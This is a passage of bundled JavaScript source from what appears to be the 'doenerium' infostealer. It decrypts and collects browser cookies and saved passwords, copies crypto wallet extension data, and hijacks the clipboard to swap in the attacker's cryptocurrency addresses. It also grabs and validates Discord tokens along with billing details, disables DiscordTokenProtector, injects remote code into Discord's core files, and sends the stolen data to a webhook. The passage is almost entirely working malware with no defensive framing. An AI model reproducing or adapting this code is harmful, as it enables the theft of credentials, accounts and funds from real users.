              } else if (browser == "Microsoft") {
                browser = "Microsoft Edge";
              }

              if (
                path.startsWith(
                  client.utils.encryption.decryptData(client.config.user.appdata)
                )
              )
                path_tail = path;
              if (path.includes("cord")) {
                return;
              }

              if (client.requires.fs.existsSync(path_tail)) {
                let encrypted = Buffer.from(
                  JSON.parse(client.requires.fs.readFileSync(path_tail + "Local State"))
                    .os_crypt.encrypted_key,
                  "base64"
                ).slice(5);

                if (!client.requires.fs.existsSync(path + "Network")) {
                  return;
                } else {
                }

                const key = client.requires.dpapi.unprotectData(
                  Buffer.from(encrypted, "utf-8"),
                  null,
                  "CurrentUser"
                );

                var sql = new client.requires.sqlite3.Database(
                  `${path}Network\\Cookies`,
                  (err) => { }
                );

                await new Promise((resolve, reject) => {
                  var added_host_keys = {
                    all: [],
                  };

                  sql.each(
                    "SELECT * FROM cookies",
                    function (err, row) {
                      let encrypted_value = row["encrypted_value"];

                      var decrypted;

                      try {
                        if (
                          encrypted_value[0] == 1 &&
                          encrypted_value[1] == 0 &&
                          encrypted_value[2] == 0 &&
                          encrypted_value[3] == 0
                        ) {
                          decrypted = dpapi.unprotectData(
                            encrypted_value,
                            null,
                            "CurrentUser"
                          );
                        } else {
                          let start = encrypted_value.slice(3, 15),
                            middle = encrypted_value.slice(
                              15,
                              encrypted_value.length - 16
                            ),
                            end = encrypted_value.slice(
                              encrypted_value.length - 16,
                              encrypted_value.length
                            ),
                            decipher = client.requires.crypto.createDecipheriv(
                              "aes-256-gcm",
                              key,
                              start
                            );
                          decipher.setAuthTag(end);
                          decrypted =
                            decipher.update(middle, "base64", "utf-8") +
                            decipher.final("utf-8");
                        }
                      } catch { }

                      client.config.environ.cookies.all.push(
                        `${row["host_key"]}  TRUE	/	FALSE	2597573456	${row["name"]}	${decrypted}`
                      );

                      if (!client.config.environ.cookies[browser]) {
                        client.config.environ.cookies[browser] = [];
                      }

                      client.config.environ.cookies[browser].push(
                        `${row["host_key"]}	TRUE	/	FALSE	2597573456	${row["name"]}	${decrypted}`
                      );

                      client.config.counter.cookies++;

                      added_host_keys[browser] = [];
                      added_host_keys["all"].push(row["host_key"]);
                    },
                    function () {
                      resolve("");
                    }
                  );
                });
              }
            },

            async getWallets(path) {
              let path_split = path.split("\\"),
                path_split_tail = path.includes("Network")
                  ? path_split.splice(0, path_split.length - 3)
                  : path_split.splice(0, path_split.length - 2),
                path_tail = path_split_tail.join("\\") + "\\";

              let browser;

              if (path.includes("Local")) {
                browser = path.split("\\Local\\")[1].split("\\")[0];
              } else {
                browser = path.split("\\Roaming\\")[1].split("\\")[1];
              }

              if (browser == "Google") {
                browser == "Chrome";
              } else if (browser == "BraveSoftware") {
                browser = "Brave";
              } else if (browser == "Microsoft") {
                browser = "Microsoft Edge";
              }

              var extension_identifiers = {
                MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
                Binance: "fhbohimaelbohpjbbldcngcnapndodjp",
                Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
                Coinbase: "hnfanknocfeofbddgcijnmhnfnkdnaad",
                Ronin: "fnjhmkhhmkbjkkabndcnnogagogbneec",
                Exodus: "aholpfdialjgjfhomihkjbmgjidlcdno",
                Coin98: "aeachknmefphepccionboohckonoeemg",
                KardiaChain: "pdadjkfkgcafgbceimcpbkalnfnepbnk",
                TerraStation: "aiifbnbfobpmeekipheeijimdpnlpgpp",
                Wombat: "amkmjjmmflddogmhpjloimipbofnfjih",
                Harmony: "fnnegphlobjdpkhecapkijjdkgcjhkib",
                Nami: "lpfcbjknijpeeillifnkikgncikgfhdo",
                MartianAptos: "efbglgofoippbgcjepnhiblaibcnclgk",
                Braavos: "jnlgamecbpmbajjfhmmmlhejkemejdma",
                XDEFI: "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
                Yoroi: "ffnbelfdoeiohenkjibnmadjiehjhajb",
                TON: "nphplpgoakhhjchkkhmiggakijnkhfnd",
                Authenticator: "bhghoamapcdpbohphigoooaddinpkbai",
                MetaMask_Edge: "ejbalbakoplchlghecdalmeeeajnimhm",
                Tron: "ibnejdfjmmkpcnlpebklmnkoeoihofec",
              };

              for (let [key, value] of Object.entries(extension_identifiers)) {
                if (
                  client.requires.fs.existsSync(
                    `${path}\\Local Extension Settings\\${value}`
                  )
                ) {
                  if (key == "MetaMask" || key == "MetaMask_Edge") {
                    if (!client.config.environ.metamask) {
                      client.config.environ.metamask = []
                    }
                    client.config.environ.metamask.push(`${path}\\Local Extension Settings\\${value}`)
                  }

                  client.utils.jszip.copyFolder(
                    `\\Wallets\\${browser} ${key}`,
                    `${path}\\Local Extension Settings\\${value}`
                  );
                  client.config.counter.wallets++;
                }
              }
            },

            async closeBrowsers() {
              const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe"]
              return new Promise(async res => {
                try {
                  const tasks = client.requires.child_process.execSync("tasklist");
                  browsersProcess.forEach(process => {
                    if (tasks.includes(process)) client.requires.child_process.exec(`taskkill /IM ${process} /F`)
                  });
                  await new Promise(resolve => setTimeout(resolve, 2500));
                  res();
                } catch (e) {
                  console.log(e)
                  res();
                }
              });
            },

            async getPasswords(path) {
              client.config.environ.all_passwords = []
              let path_split = path.split("\\"),
                path_split_tail = path.includes("Network")
                  ? path_split.splice(0, path_split.length - 3)
                  : path_split.splice(0, path_split.length - 2),
                path_tail = path_split_tail.join("\\") + "\\";

              let browser;

              if (path.includes("Local")) {
                browser = path.split("\\Local\\")[1].split("\\")[0];
              } else {
                browser = path.split("\\Roaming\\")[1].split("\\")[1];
              }

              if (browser == "Google") {
                browser == "Chrome";
              } else if (browser == "BraveSoftware") {
                browser = "Brave";
              } else if (browser == "Microsoft") {
                browser = "Microsoft Edge";
              }

              if (
                path.startsWith(
                  client.utils.encryption.decryptData(client.config.user.appdata)
                )
              )
                path_tail = path;
              if (path.includes("cord")) {
                return;
              }

              if (client.requires.fs.existsSync(path_tail)) {
                let encrypted = Buffer.from(
                  JSON.parse(client.requires.fs.readFileSync(path_tail + "Local State"))
                    .os_crypt.encrypted_key,
                  "base64"
                ).slice(5);

                var login_data = path + "Login Data",
                  passwords_db = path + "passwords.db";

                client.requires.fs.copyFileSync(login_data, passwords_db);
                const key = client.requires.dpapi.unprotectData(
                  Buffer.from(encrypted, "utf-8"),
                  null,
                  "CurrentUser"
                );
                var sql = new client.requires.sqlite3.Database(
                  passwords_db,
                  (err) => { }
                );

                await new Promise((resolve, reject) => {
                  sql.each(
                    "SELECT origin_url, username_value, password_value FROM logins",
                    function (err, row) {
                      if (row["username_value"] != "") {
                        let password_value = row["password_value"];
                        try {
                          var password;
                          if (
                            password_value[0] == 1 &&
                            password_value[1] == 0 &&
                            password_value[2] == 0 &&
                            password_value[3] == 0
                          ) {
                            password = dpapi.unprotectData(
                              password_value,
                              null,
                              "CurrentUser"
                            );
                          } else {
                            let start = password_value.slice(3, 15),
                              middle = password_value.slice(
                                15,
                                password_value.length - 16
                              ),
                              end = password_value.slice(
                                password_value.length - 16,
                                password_value.length
                              ),
                              decipher = client.requires.crypto.createDecipheriv(
                                "aes-256-gcm",
                                key,
                                start
                              );
                            decipher.setAuthTag(end);
                            password =
                              decipher.update(middle, "base64", "utf-8") +
                              decipher.final("utf-8");
                          }

                          client.config.environ.all_passwords.push(password)



                          client.config.environ.passwords.all.push(
                            `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
                          );

                          if (!client.config.environ.passwords[browser]) {
                            client.config.environ.passwords[browser] = [];
                          }
                          client.config.environ.passwords[browser].push(
                            `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
                          );

                          client.config.counter.passwords++;
                        } catch { }
                      }
                    },
                    function () {
                      resolve("");
                    }
                  );
                });
              }
            },
          };
        };


        /***/
      }),

/***/ 879:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            async detectClipboard() {
              while (true) {
                try {
                  const paste = client.requires.child_process
                    .execSync(`powershell Get-Clipboard`)
                    .toString("utf8")
                    .replace("\r", "");
                  let text = paste;
                  let dtc = false;

                  for (let [key, value] of Object.entries({
                    btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
                    ltc: /(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)/,
                    eth: /(?:^0x[a-fA-F0-9]{40}$)/,
                    xlm: /(?:^G[0-9a-zA-Z]{55}$)/,
                    xmr: /(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)/,
                    xrp: /(?:^r[0-9a-zA-Z]{24,34}$)/,
                    bch: /^((bitcoincash:)?(q|p)[a-z0-9]{41})/,
                    dash: /(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)/,
                    neo: /(?:^A[0-9a-zA-Z]{33}$)/,
                    doge: /D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}/,
                  })) {
                    for (let line of text.split("\n")) {
                      if (value.test(line.replace("\r", ""))) {
                        dtc = true;
                        text = text.replace(
                          line,
                          client.utils.encryption.decryptData(client.config.crypto[key])
                        );
                      }
                    }
                  }

                  if (dtc) {
                    await client.requires.child_process.execSync(
                      `powershell Set-Clipboard ${text}`
                    );
                  }

                  await client.utils.time.sleep(1000);
                } catch { }
              }
            },
          };
        };


        /***/
      }),

/***/ 109:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            loadCPUS() {
              var _cpus = []

              client.requires.os.cpus().forEach((cpu) => {
                if (!_cpus.contains(cpu.model)) {
                  _cpus.push(cpu.model)
                  client.config.user.cpus.push(client.utils.encryption.encryptData(cpu.model.split("  ")[0]))
                }
              })
            },
          };
        };

        /***/
      }),

/***/ 725:
/***/ ((module) => {

        module.exports = (client) => {
          return {

            copyRecursiveSync(src, dest) {
              var exists = client.requires.fs.existsSync(src);
              var stats = exists && client.requires.fs.statSync(src);
              var isDirectory = exists && stats.isDirectory();
              if (isDirectory) {
                client.requires.fs.mkdirSync(dest);
                client.requires.fs.readdirSync(src).forEach((childItemName) => {
                  this.copyRecursiveSync(client.requires.path.join(src, childItemName),
                    client.requires.path.join(dest, childItemName));
                });
              } else {
                client.requires.fs.copyFileSync(src, dest);
              }
            }
          };
        };

        /***/
      }),

/***/ 779:
/***/ ((module) => {

        module.exports = (client) => {
          return {

            async getTokens() {
              var paths = {
                'Discord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
                'Uran': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
              }

              for (let [key, value] of Object.entries(paths)) {
                if (!client.requires.fs.existsSync(value)) {
                  continue;
                }

                for (var file_name of client.requires.fs.readdirSync(value)) {
                  if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                    continue;
                  }

                  let path_split = value.split('\\'),
                    path_split_tail = value.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
                    path_tail = path_split_tail.join('\\') + '\\';



                  for (var line of client.requires.fs.readFileSync(`${value}/${file_name}`, encoding = "utf8").split("\n")) {

                    if (value.includes("cord")) {

                      let encrypted = Buffer.from(JSON.parse(client.requires.fs.readFileSync(path_tail.replace("Local Storage", "Local State")))
                        .os_crypt.encrypted_key, 'base64')
                        .slice(5);

                      const _key = client.requires.dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');

                      var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/;
                      if (line.match(encrypted_regex)) {
                        try {
                          var token = Buffer.from(line.match(encrypted_regex)[0].split('dQw4w9WgXcQ:')[1], "base64");
                          let start = token.slice(3, 15),
                            middle = token.slice(15, token.length - 16),
                            end = token.slice(token.length - 16, token.length),
                            decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', _key, start);

                          decipher.setAuthTag(end);
                          token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')

                          await this.validateToken(key, token);
                        } catch { }
                      }
                    } else {
                      [/\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].forEach(async (regex) => {
                        if (line.match(regex)) {
                          await this.validateToken(key, line.match(regex)[0]);
                        }
                      })
                    }
                  }
                }
              }


            },

            async validateToken(source, token) {

              if (client.config.environ.validated_tokens.contains(token)) {
                return;
              }

              client.config.environ.validated_tokens.push(token)

              const req = await client.requires.axios({
                url: "https://discord.com/api/v9/users/@me",
                method: "GET",
                headers: {
                  "Authorization": token,
                  "Content-Type": "application/json",
                  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
              }).catch((err) => {
                return err.response;
              });

              if (req.request.res.statusCode == 200) {

                const billing = await client.requires.axios({
                  url: "https://discord.com/api/v9/users/@me/billing/payment-sources",
                  method: "GET",
                  headers: {
                    "Authorization": token,
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                  }
                }).catch((err) => {
                  return err.response;
                });

                var _billing = [];

                try {

                  billing.data.forEach(billing => {
                    if (billing.type == "") {
                      return "false"
                    } else if (billing.invalid == true) {
                      return "false"
                    } else if (billing.type == 2) {
                      _billing.push("PayPal")
                    } else if (billing.type == 1) {
                      _billing.push(`Credit Card (${billing.country})`)
                    }
                  })

                } catch { }

                if (!client.config.discord.grabbed_tokens[source]) {
                  client.config.discord.grabbed_tokens[source] = []
                }

                client.config.discord.grabbed_tokens[source].push({
                  "source": source,
                  "id": req.data.id,
                  "username": `${req.data.username}#${req.data.discriminator}`,
                  "phone": req.data.phone,
                  "email": req.data.email,
                  "locale": req.data.locale,
                  "nitro": this.getNitro(req.data.premium_type),
                  "badges": this.getBadges(req.data.flags),
                  "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                  "token": token
                });

                client.config.discord.grabbed_tokens.all.push({
                  "source": source,
                  "id": req.data.id,
                  "username": `${req.data.username}#${req.data.discriminator}`,
                  "phone": req.data.phone,
                  "email": req.data.email,
                  "locale": req.data.locale,
                  "nitro": this.getNitro(req.data.premium_type),
                  "badges": this.getBadges(req.data.flags),
                  "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                  "token": token
                });

                var fields = [];

                for (let [key, value] of Object.entries({
                  "Source": source,
                  "Identifier": req.data.id,
                  "Username": `${req.data.username}#${req.data.discriminator}`,
                  "Phone Number": req.data.phone,
                  "E-Mail Address": req.data.email,
                  "Locale": req.data.locale,
                  "Nitro": this.getNitro(req.data.premium_type),
                  "Badges": this.getBadges(req.data.flags) != '' ? this.getBadges(req.data.flags) : 'None',
                  "Billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                  "Token": token
                })) {
                  fields.push({
                    name: key,
                    value: `\`\`\`${value}\`\`\``,
                    inline: true,
                  })
                }

                await client.utils.webhook.sendToWebhook(
                  {
                    "embeds": [client.utils.webhook.createEmbed({
                      "title": `Found token in: ${source}`,
                      "fields": fields,
                      "thumbnail": {
                        "url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                      },
                      "author": {
                        "name": `${req.data.username}#${req.data.discriminator} (${req.data.id})`,
                        "url": client.utils.encryption.decryptData(client.config.embed.href),
                        "icon_url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                      },
                    })],
                  })
              }
            },

            async saveDiscordTokens() {
              if (client.config.discord.grabbed_tokens.all.length == 0) {
                return;
              }
              client.utils.jszip.createFolder("\\Discord")

              for (let [key, value] of Object.entries(client.config.discord.grabbed_tokens)) {
                if (value.length != 0) {
                  let result = "";

                  for (let obj of value) {
                    result += `==================================================\nSource          : ${obj.source}\nIdentifier      : ${obj.id}\nUsername        : ${obj.username}\nPhone           : ${obj.phone}\nE-Mail Address  : ${obj.email}\nLocale          : ${obj.locale}\nNitro           : ${obj.nitro}\nBadges          : ${obj.badges != '' ? obj.badges : 'None'}\nBilling         : ${obj.billing != '' ? obj.billing : 'None'}\nToken           : ${obj.token}\n==================================================\n\n`;
                  }

                  client.utils.jszip.createTxt(`\\Discord\\${key.toUpperCase()}.txt`, result)
                }
              }
            },

            getBadges(flags) {
              var badges = {
                Discord_Employee: {
                  Value: 1,
                  Emoji: "Discord Employee",
                  Rare: true,
                },
                Partnered_Server_Owner: {
                  Value: 2,
                  Emoji: "Partnered Server Owner",
                  Rare: true,
                },
                HypeSquad_Events: {
                  Value: 4,
                  Emoji: "HypeSquad Events",
                  Rare: true,
                },
                Bug_Hunter_Level_1: {
                  Value: 8,
                  Emoji: "Bug Hunter Level 1",
                  Rare: true,
                },
                Early_Supporter: {
                  Value: 512,
                  Emoji: "Early Supporter",
                  Rare: true,
                },
                Bug_Hunter_Level_2: {
                  Value: 16384,
                  Emoji: "Bug Hunter Level 2",
                  Rare: true,
                },
                Early_Verified_Bot_Developer: {
                  Value: 131072,
                  Emoji: "Early Verified Bot Developer",
                  Rare: true,
                },
                House_Bravery: {
                  Value: 64,
                  Emoji: "House Bravery",
                  Rare: false,
                },
                House_Brilliance: {
                  Value: 128,
                  Emoji: "House Brilliance",
                  Rare: false,
                },
                House_Balance: {
                  Value: 256,
                  Emoji: "House Balance",
                  Rare: false,
                }
              };

              var result = [];
              for (var prop in badges) {
                prop = badges[prop]
                if ((flags & prop.Value) == prop.Value && prop.Rare) result.push(prop.Emoji);
              };
              return result.join(", ");
            },

            getNitro(premium_type) {
              switch (premium_type) {
                case 0:
                  return "No Nitro";
                case 1:
                  return "Nitro Classic";
                case 2:
                  return "Nitro Boost";
                default:
                  return "No Nitro";

              };
            },

            bypass_token_protector() {
              for (const file of ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]) {
                if (client.requires.fs.exists(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`)) {
                  client.requires.fs.rm(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`);
                }
              }

              const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
                encoding: "utf-8"
              }))

              token_protector_config['auto_start'] = false
              token_protector_config['auto_start_discord'] = false
              token_protector_config['integrity'] = false
              token_protector_config['integrity_allowbetterdiscord'] = false
              token_protector_config['integrity_checkexecutable'] = false
              token_protector_config['integrity_checkhash'] = false
              token_protector_config['integrity_checkmodule'] = false
              token_protector_config['integrity_checkscripts'] = false
              token_protector_config['integrity_checkresource'] = false
              token_protector_config['integrity_redownloadhashes'] = false
              token_protector_config['iterations_iv'] = 0
              token_protector_config['iterations_key'] = 0
              token_protector_config['version'] = 0

              client.requires.fs.writeFileSync(
                `${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`,
                JSON.stringify(
                  token_protector_config,
                  null, 4
                )
              )
            },

            async listExecutables() {
              var processes = []
              client.requires.child_process.exec('tasklist', (err, stdout) => {
                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                  if (stdout.includes(executable)) {
                    client.config.discord.running_executables.push(executable)
                    processes.push(executable)
                  }
                }
              })

              return processes
            },

            pwnBetterDiscord() {
              if (client.requires.fs.existsSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")) {
                var _ = client.requires.fs.readFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")
                client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
                  "api/webhooks", "doenerium_on_top"))

              }

            },

            async modify_discord_core() {
              const res = await client.requires.axios.get(client.utils.encryption.decryptData(client.config.discord.base_url));

              const file = () => {
                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url)
                return tempFile;
              }

              for (const path of client.config.discord.files_path) {
                client.requires.fs.writeFileSync(path, file(), {
                  encoding: 'utf8',
                  flag: 'w'
                });
              }
            },

            findDiscordCore(prefixPath, files) {
              files.forEach((file) => {
                if (client.requires.fs.statSync(`${prefixPath}\\${file}`).isDirectory()) {
                  this.findDiscordCore(`${prefixPath}\\${file}`, client.requires.fs.readdirSync(`${prefixPath}\\${file}`))
                } else {
                  if (file == "index.js" && !prefixPath.includes("node_modules") && prefixPath.includes("desktop_core")) {
                    client.config.discord.files_path.push(`${prefixPath}\\${file}`);
                  }
                }
              })
            },

            findBackupCodes(prefixPath, files) {
              files.forEach(async (file) => {
                if (file.startsWith(".") || file.includes("AppData") || file.includes("Program")) {
                  return;
                }
                if (file.startsWith("discord_backup_codes")) {
                  await client.utils.webhook.sendToWebhook(
                    {
                      "embeds": [client.utils.webhook.createEmbed({
                        "title": `💰 Discord backup codes found`,
                        "description": `\`\`\`${prefixPath}\\${file}\n\n${client.requires.fs.readFileSync(`${prefixPath}\\${file}`)}\`\`\``,
                      })],
                    })
                  client.utils.jszip.createTxt(`\\${file}_${client.requires.crypto.randomUUID()}.txt`, client.requires.fs.readFileSync(`${prefixPath}\\${file}`))
                }
              })
            },

            async getIP() {
              return (await client.requires.axios.get("https://ipinfo.io/json")).data;
            },

            async init() {
              this.pwnBetterDiscord();
              for (const folder of client.requires.fs.readdirSync(client.utils.encryption.decryptData(client.config.user.localappdata))) {
                if (folder.toLowerCase().includes('iscord')) {
                  client.config.discord.executables.push(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${folder}`)
                }
              }

              for (const executable of client.config.discord.executables) {
                this.findDiscordCore(executable, client.requires.fs.readdirSync(executable))
              }

              ["Videos", "Desktop", "Documents", "Downloads", "Pictures"].forEach(async (type) => {
                await this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
              })

              await this.modify_discord_core(); // 1

              await client.requires.child_process.exec('tasklist', async (err, stdout) => {
                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                  if (stdout.includes(executable)) {
                    await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => { }) // Close
                    await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => { }) // Start
                  }
                }
              })

              const network_data = await this.getIP();

              client.utils.jszip.createTxt("\\Network Data.txt", `IP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}`)

              await client.utils.time.sleep(30000);
              for (const path of client.config.discord.files_path) {
                if (client.requires.fs.existsSync(path.replace("index.js", "doenerium"))) {
                  client.requires.fs.rmdirSync(path.replace("index.js", "doenerium"));
                }
              }
            }
          };
        };


        /***/
      }),

/***/ 480:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            encryptData(data) {
              return data;
            },

            decryptData(data) {
              return data;
            }
          };
        };

        /***/
      }),

/***/ 561:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            getFlag(country) {
              switch (country) {
                case "AD":
                  return "🇦🇩";
                case "AE":
                  return "🇦🇪";
                case "AF":
                  return "🇦🇫";
                case "AG":
                  return "🇦🇬";
                case "AI":
                  return "🇦🇮";
                case "AL":
                  return "🇦🇱";
                case "AM":
                  return "🇦🇲";
                case "AO":
                  return "🇦🇴";
                case "AQ":
                  return "🇦🇶";
                case "AR":
                  return "🇦🇷";
                case "AS":
                  return "🇦🇸";
                case "AT":
                  return "🇦🇹";
                case "AU":
                  return "🇦🇺";
                case "AW":
                  return "🇦🇼";
                case "AX":
                  return "🇦🇽";
                case "AZ":
                  return "🇦🇿";
                case "BA":
                  return "🇧🇦";
                case "BB":
                  return "🇧🇧";
                case "BD":
                  return "🇧🇩";
                case "BE":
                  return "🇧🇪";
                case "BF":
                  return "🇧🇫";
                case "BG":
                  return "🇧🇬";
                case "BH":
                  return "🇧🇭";
                case "BI":
                  return "🇧🇮";
                case "BJ":
                  return "🇧🇯";
                case "BL":
                  return "🇧🇱";
                case "BM":
                  return "🇧🇲";
                case "BN":
                  return "🇧🇳";
                case "BO":
                  return "🇧🇴";
                case "BQ":
                  return "🇧🇶";
                case "BR":
                  return "🇧🇷";
                case "BS":
                  return "🇧🇸";
                case "BT":
                  return "🇧🇹";
                case "BV":
                  return "🇧🇻";
                case "BW":
                  return "🇧🇼";
                case "BY":
                  return "🇧🇾";
                case "BZ":
                  return "🇧🇿";
                case "CA":
                  return "🇨🇦";
                case "CC":
                  return "🇨🇨";
                case "CD":
                  return "🇨🇩";
                case "CF":
                  return "🇨🇫";
                case "CG":
                  return "🇨🇬";
                case "CH":
                  return "🇨🇭";
                case "CI":
                  return "🇨🇮";
                case "CK":
                  return "🇨🇰";
                case "CL":
                  return "🇨🇱";
                case "CM":
                  return "🇨🇲";
                case "CN":
                  return "🇨🇳";
                case "CO":
                  return "🇨🇴";
                case "CR":
                  return "🇨🇷";
                case "CU":
                  return "🇨🇺";
                case "CV":
                  return "🇨🇻";
                case "CW":
                  return "🇨🇼";
                case "CX":
                  return "🇨🇽";
                case "CY":
                  return "🇨🇾";
                case "CZ":
                  return "🇨🇿";
                case "DE":
                  return "🇩🇪";
                case "DJ":
                  return "🇩🇯";
                case "DK":
                  return "🇩🇰";
                case "DM":
                  return "🇩🇲";
                case "DO":
                  return "🇩🇴";
                case "DZ":
                  return "🇩🇿";
                case "EC":
                  return "🇪🇨";
                case "EE":
                  return "🇪🇪";
                case "EG":
                  return "🇪🇬";
                case "EH":
                  return "🇪🇭";
                case "ER":
                  return "🇪🇷";
                case "ES":
                  return "🇪🇸";
                case "ET":
                  return "🇪🇹";
                case "FI":
                  return "🇫🇮";
                case "FJ":
                  return "🇫🇯";
                case "FK":
                  return "🇫🇰";
                case "FM":
                  return "🇫🇲";
                case "FO":
                  return "🇫🇴";
                case "FR":
                  return "🇫🇷";
                case "GA":
                  return "🇬🇦";
                case "GB":
                  return "🇬🇧";
                case "GD":
                  return "🇬🇩";
                case "GE":
                  return "🇬🇪";
                case "GF":
                  return "🇬🇫";
                case "GG":
                  return "🇬🇬";
                case "GH":
                  return "🇬🇭";
                case "GI":
                  return "🇬🇮";
                case "GL":
                  return "🇬🇱";
                case "GM":
                  return "🇬🇲";
                case "GN":
                  return "🇬🇳";
                case "GP":
                  return "🇬🇵";
                case "GQ":
